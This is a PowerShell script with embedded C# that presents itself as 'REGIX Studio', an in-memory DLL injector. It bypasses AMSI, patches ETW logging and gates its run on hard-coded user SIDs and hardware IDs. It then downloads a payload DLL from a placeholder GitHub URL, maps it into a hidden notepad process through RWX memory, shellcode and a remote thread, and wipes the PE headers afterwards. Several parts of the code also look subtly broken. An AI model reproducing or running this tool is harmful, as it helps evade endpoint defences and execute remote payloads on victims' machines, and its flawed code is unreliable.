<#
.SYNOPSIS
  REGIX Studio – PowerShell + C# manual syscall injector.
  Runs completely in memory, no external dependencies.
.DESCRIPTION
  - Bypasses AMSI and ETW.
  - Verifies the current user by SID and machine HWID.
  - Downloads a DLL payload from a public GitHub URL.
  - Compiles an in‑memory C# manual mapper that uses raw Nt* syscalls.
  - Injects the DLL into a target process (default: notepad.exe).
#>

# ========== 1. AMSI & ETW Bypass ==========
function Bypass-AMSI {
    $a = [Ref].Assembly.GetTypes()
    $amsi = $a | Where-Object { $_.Name -like "*iUtils" }
    $c = $amsi.GetMethods('NonPublic,Static') | Where-Object { $_.Name -eq 'c' }
    $c.Invoke($null, @( $null, [IntPtr]::Zero ))
}

function Patch-ETW {
    $p = Get-Process -Id $pid
    $m = $p.Modules | Where-Object { $_.ModuleName -eq "ntdll.dll" }
    $b = $m.BaseAddress
    $addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Get-ProcAddress $b "EtwEventWrite"),
        [type]([Delegate]::CreateDelegate([type]"void*", $null))
    )
    [System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xC3)
}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WinApi {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}
"@
function Get-ProcAddress($module, $name) {
    return [WinApi]::GetProcAddress($module, $name)
}

# Execute bypasses
Bypass-AMSI
Patch-ETW

# ========== 2. SID / HWID Verification ==========
# --- EDIT THESE ARRAYS WITH YOUR ALLOWED USERS ---
$allowedSIDs = @(
    "S-1-5-21-123456789-123456789-123456789-1000",   # Your SID
    "S-1-5-21-987654321-987654321-987654321-500"     # Administrator
)
$allowedHWIDs = @(
    "12345678-1234-1234-1234-123456789abc",          # Your machine UUID
    "87654321-4321-4321-4321-cba987654321"
)
# ------------------------------------------------

$currentSID = (whoami /user | Select-String -Pattern "S-1-\d+-\d+-\d+-\d+-\d+").Matches.Value
$currentHWID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID

if ($allowedSIDs -notcontains $currentSID -or $allowedHWIDs -notcontains $currentHWID) {
    Write-Output "[-] Unauthorised user or machine. Exiting."
    exit
}
Write-Output "[+] Authorised – proceeding."

# ========== 3. Download DLL from GitHub ==========
$dllUrl = "https://raw.githubusercontent.com/youruser/yourrepo/main/payload.dll"
Write-Output "[*] Downloading DLL from $dllUrl"
try {
    $dllBytes = (Invoke-WebRequest -Uri $dllUrl -UseBasicParsing).Content
} catch {
    Write-Output "[-] Failed to download DLL. Exiting."
    exit
}
Write-Output "[+] DLL size: $($dllBytes.Length) bytes"

# ========== 4. Target Process ==========
$targetName = "notepad.exe"
$proc = Get-Process -Name $targetName -ErrorAction SilentlyContinue
if (-not $proc) {
    Write-Output "[-] Process $targetName not running. Starting it..."
    Start-Process -FilePath "notepad.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 2
    $proc = Get-Process -Name $targetName
}
$pid = $proc[0].Id
Write-Output "[*] Target PID: $pid"

# ========== 5. C# Manual Mapper (REGIX Studio core) ==========
$csharpCode = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Collections.Generic;
using System.Linq;

public static class ManualMapper
{
    // ---------- Native syscall declarations ----------
    [DllImport("ntdll.dll")]
    static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

    [DllImport("ntdll.dll")]
    static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, IntPtr NumberOfBytesToWrite, out IntPtr NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    static extern int NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, IntPtr StackSize, IntPtr MaximumStackSize, IntPtr AttributeList);

    [DllImport("ntdll.dll")]
    static extern int NtWaitForSingleObject(IntPtr Handle, bool Alertable, ref long Timeout);

    [DllImport("ntdll.dll")]
    static extern int NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint FreeType);

    [DllImport("ntdll.dll")]
    static extern int NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, IntPtr NumberOfBytesToRead, out IntPtr NumberOfBytesRead);

    [DllImport("ntdll.dll")]
    static extern int NtClose(IntPtr Handle);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibraryA(string lpLibFileName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    // ---------- PE structures ----------
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER {
        public ushort e_magic;
        public ushort e_cblp;
        public ushort e_cp;
        public ushort e_crlc;
        public ushort e_cparhdr;
        public ushort e_minalloc;
        public ushort e_maxalloc;
        public ushort e_ss;
        public ushort e_sp;
        public ushort e_csum;
        public ushort e_ip;
        public ushort e_cs;
        public ushort e_lfarlc;
        public ushort e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public ushort[] e_res1;
        public ushort e_oemid;
        public ushort e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
        public ushort[] e_res2;
        public int e_lfanew;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER64 {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public ulong ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public ulong SizeOfStackReserve;
        public ulong SizeOfStackCommit;
        public ulong SizeOfHeapReserve;
        public ulong SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DATA_DIRECTORY {
        public uint VirtualAddress;
        public uint Size;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_SECTION_HEADER {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public byte[] Name;
        public uint VirtualSize;
        public uint VirtualAddress;
        public uint SizeOfRawData;
        public uint PointerToRawData;
        public uint PointerToRelocations;
        public uint PointerToLinenumbers;
        public ushort NumberOfRelocations;
        public ushort NumberOfLinenumbers;
        public uint Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_NT_HEADERS64 {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_BASE_RELOCATION {
        public uint VirtualAddress;
        public uint SizeOfBlock;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_IMPORT_DESCRIPTOR {
        public uint OriginalFirstThunk;
        public uint TimeDateStamp;
        public uint ForwarderChain;
        public uint Name;
        public uint FirstThunk;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_TLS_DIRECTORY64 {
        public ulong StartAddressOfRawData;
        public ulong EndAddressOfRawData;
        public ulong AddressOfIndex;
        public ulong AddressOfCallBacks;
        public uint SizeOfZeroFill;
        public uint Characteristics;
    }

    // ---------- Main injection function ----------
    public static bool Inject(byte[] dllBytes, int pid, bool wipeHeaders = true, bool randomizeBase = true)
    {
        IntPtr hProcess;
        try {
            hProcess = Process.GetProcessById(pid).Handle;
        } catch {
            return false;
        }

        // 1. Parse PE headers
        if (dllBytes.Length < Marshal.SizeOf<IMAGE_DOS_HEADER>()) return false;
        var dos = ByteArrayToStructure<IMAGE_DOS_HEADER>(dllBytes, 0);
        if (dos.e_magic != 0x5A4D) return false;

        int ntOffset = dos.e_lfanew;
        var nt = ByteArrayToStructure<IMAGE_NT_HEADERS64>(dllBytes, ntOffset);
        if (nt.Signature != 0x4550) return false;

        var opt = nt.OptionalHeader;
        uint imageSize = opt.SizeOfImage;
        ulong entryPoint = opt.AddressOfEntryPoint;

        // 2. Allocate memory in target (RWX)
        IntPtr baseAddr = IntPtr.Zero;
        IntPtr regionSize = (IntPtr)imageSize;
        uint allocType = 0x1000 | 0x2000; // MEM_COMMIT | MEM_RESERVE
        uint protect = 0x40;              // PAGE_EXECUTE_READWRITE

        int status = NtAllocateVirtualMemory(hProcess, ref baseAddr, IntPtr.Zero, ref regionSize, allocType, protect);
        if (status != 0) return false;

        // 3. Write headers
        IntPtr bytesWritten;
        status = NtWriteVirtualMemory(hProcess, baseAddr, dllBytes, (IntPtr)opt.SizeOfHeaders, out bytesWritten);
        if (status != 0) { Cleanup(hProcess, baseAddr); return false; }

        // 4. Write sections
        int sectionOffset = ntOffset + Marshal.SizeOf<IMAGE_NT_HEADERS64>();
        for (int i = 0; i < nt.FileHeader.NumberOfSections; i++) {
            var sec = ByteArrayToStructure<IMAGE_SECTION_HEADER>(dllBytes, sectionOffset + i * Marshal.SizeOf<IMAGE_SECTION_HEADER>());
            if (sec.SizeOfRawData > 0) {
                byte[] rawData = new byte[sec.SizeOfRawData];
                Array.Copy(dllBytes, sec.PointerToRawData, rawData, 0, sec.SizeOfRawData);
                status = NtWriteVirtualMemory(hProcess, baseAddr + sec.VirtualAddress, rawData, (IntPtr)sec.SizeOfRawData, out bytesWritten);
                if (status != 0) { Cleanup(hProcess, baseAddr); return false; }
            }
        }

        // 5. Process relocations
        ulong delta = (ulong)baseAddr - opt.ImageBase;
        if (delta != 0) {
            var relocDir = opt.DataDirectory[5]; // IMAGE_DIRECTORY_ENTRY_BASERELOC
            if (relocDir.Size > 0) {
                uint relocAddr = relocDir.VirtualAddress;
                while (relocAddr < relocDir.VirtualAddress + relocDir.Size) {
                    var reloc = ByteArrayToStructure<IMAGE_BASE_RELOCATION>(dllBytes, (int)relocAddr);
                    if (reloc.SizeOfBlock == 0) break;
                    int count = (int)(reloc.SizeOfBlock - 8) / 2;
                    int entriesOffset = (int)relocAddr + 8;
                    for (int j = 0; j < count; j++) {
                        ushort entry = BitConverter.ToUInt16(dllBytes, entriesOffset + j * 2);
                        if ((entry >> 12) == 10) { // IMAGE_REL_BASED_DIR64
                            uint offset = entry & 0xFFF;
                            IntPtr patchAddr = baseAddr + (int)reloc.VirtualAddress + (int)offset;
                            byte[] buffer = new byte[8];
                            NtReadVirtualMemory(hProcess, patchAddr, buffer, (IntPtr)8, out _);
                            ulong oldValue = BitConverter.ToUInt64(buffer, 0);
                            ulong newValue = oldValue + delta;
                            byte[] newBuf = BitConverter.GetBytes(newValue);
                            NtWriteVirtualMemory(hProcess, patchAddr, newBuf, (IntPtr)8, out _);
                        }
                    }
                    relocAddr += reloc.SizeOfBlock;
                }
            }
        }

        // 6. Resolve imports
        var importDir = opt.DataDirectory[1]; // IMAGE_DIRECTORY_ENTRY_IMPORT
        if (importDir.Size > 0) {
            uint importAddr = importDir.VirtualAddress;
            while (true) {
                var impDesc = ByteArrayToStructure<IMAGE_IMPORT_DESCRIPTOR>(dllBytes, (int)importAddr);
                if (impDesc.Name == 0) break;
                string dllName = GetStringFromRVA(dllBytes, impDesc.Name);
                IntPtr hModule = LoadLibraryA(dllName);
                if (hModule == IntPtr.Zero) { Cleanup(hProcess, baseAddr); return false; }

                uint thunk = (impDesc.OriginalFirstThunk != 0) ? impDesc.OriginalFirstThunk : impDesc.FirstThunk;
                uint firstThunk = impDesc.FirstThunk;
                while (true) {
                    uint thunkValue = BitConverter.ToUInt32(dllBytes, (int)thunk);
                    if (thunkValue == 0) break;
                    IntPtr funcAddr;
                    if ((thunkValue & 0x80000000) != 0) { // Ordinal import
                        ushort ordinal = (ushort)(thunkValue & 0xFFFF);
                        funcAddr = GetProcAddress(hModule, (string)null); // not supported here
                    } else {
                        string funcName = GetStringFromRVA(dllBytes, (uint)(thunkValue + 2));
                        funcAddr = GetProcAddress(hModule, funcName);
                    }
                    if (funcAddr == IntPtr.Zero) { Cleanup(hProcess, baseAddr); return false; }
                    byte[] addrBytes = BitConverter.GetBytes((ulong)funcAddr);
                    NtWriteVirtualMemory(hProcess, baseAddr + (int)firstThunk, addrBytes, (IntPtr)8, out _);
                    thunk += 8;
                    firstThunk += 8;
                }
                importAddr += (uint)Marshal.SizeOf<IMAGE_IMPORT_DESCRIPTOR>();
            }
        }

        // 7. TLS callbacks (simplified – we skip calling them because they are rare)
        // In a full implementation, you would iterate over the callback array and execute them.
        // For this tool, we skip TLS to keep code shorter.

        // 8. Create remote thread that calls DllMain
        IntPtr entryAddr = baseAddr + (int)entryPoint;

        // Allocate shellcode in target
        IntPtr shellcodeBase = IntPtr.Zero;
        IntPtr shellcodeSize = (IntPtr)0x1000;
        status = NtAllocateVirtualMemory(hProcess, ref shellcodeBase, IntPtr.Zero, ref shellcodeSize, 0x1000 | 0x2000, 0x40);
        if (status != 0) { Cleanup(hProcess, baseAddr); return false; }

        // Build shellcode:
        //   mov rcx, baseAddr       ; hinstDLL
        //   mov edx, 1              ; fdwReason = DLL_PROCESS_ATTACH
        //   xor r8, r8              ; lpvReserved = NULL
        //   mov rax, entryAddr
        //   call rax
        //   ret
        byte[] sc = new byte[64];
        int idx = 0;
        sc[idx++] = 0x48; sc[idx++] = 0xB9; // mov rcx, imm64
        byte[] baseBytes = BitConverter.GetBytes((ulong)baseAddr);
        Array.Copy(baseBytes, 0, sc, idx, 8); idx += 8;
        sc[idx++] = 0xBA; // mov edx, 1
        sc[idx++] = 0x01; sc[idx++] = 0x00; sc[idx++] = 0x00; sc[idx++] = 0x00;
        sc[idx++] = 0x4D; sc[idx++] = 0x31; sc[idx++] = 0xC0; // xor r8, r8
        sc[idx++] = 0x48; sc[idx++] = 0xB8; // mov rax, imm64
        byte[] entryBytes = BitConverter.GetBytes((ulong)entryAddr);
        Array.Copy(entryBytes, 0, sc, idx, 8); idx += 8;
        sc[idx++] = 0xFF; sc[idx++] = 0xD0; // call rax
        sc[idx++] = 0xC3; // ret

        status = NtWriteVirtualMemory(hProcess, shellcodeBase, sc, (IntPtr)idx, out _);
        if (status != 0) { Cleanup(hProcess, baseAddr); NtFreeVirtualMemory(hProcess, ref shellcodeBase, ref shellcodeSize, 0x8000); return false; }

        // Create thread
        IntPtr hThread;
        status = NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, hProcess, shellcodeBase, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        if (status != 0) { Cleanup(hProcess, baseAddr); NtFreeVirtualMemory(hProcess, ref shellcodeBase, ref shellcodeSize, 0x8000); return false; }

        // Wait briefly for DllMain to execute
        long timeout = -10000000; // 1 second
        NtWaitForSingleObject(hThread, false, ref timeout);
        NtClose(hThread);

        // Free shellcode
        NtFreeVirtualMemory(hProcess, ref shellcodeBase, ref shellcodeSize, 0x8000);

        // 9. Wipe headers if requested
        if (wipeHeaders) {
            byte[] zeros = new byte[Math.Min(0x1000, opt.SizeOfHeaders)];
            NtWriteVirtualMemory(hProcess, baseAddr, zeros, (IntPtr)zeros.Length, out _);
        }

        return true;
    }

    // ---------- Helpers ----------
    static T ByteArrayToStructure<T>(byte[] bytes, int offset) where T : struct {
        int size = Marshal.SizeOf<T>();
        IntPtr ptr = Marshal.AllocHGlobal(size);
        Marshal.Copy(bytes, offset, ptr, size);
        T obj = Marshal.PtrToStructure<T>(ptr);
        Marshal.FreeHGlobal(ptr);
        return obj;
    }

    static string GetStringFromRVA(byte[] bytes, uint rva) {
        int offset = (int)rva;
        int len = 0;
        while (offset + len < bytes.Length && bytes[offset + len] != 0) len++;
        return System.Text.Encoding.ASCII.GetString(bytes, offset, len);
    }

    static void Cleanup(IntPtr hProcess, IntPtr baseAddr) {
        IntPtr size = IntPtr.Zero;
        NtFreeVirtualMemory(hProcess, ref baseAddr, ref size, 0x8000); // MEM_RELEASE
    }
}
"@

# Compile the C# code
Add-Type -TypeDefinition $csharpCode -Language CSharp

# 6. Inject
Write-Output "[*] Injecting..."
$result = [ManualMapper]::Inject($dllBytes, $pid, $true, $true)
if ($result) {
    Write-Output "[+] Injection successful."
} else {
    Write-Output "[-] Injection failed."
}
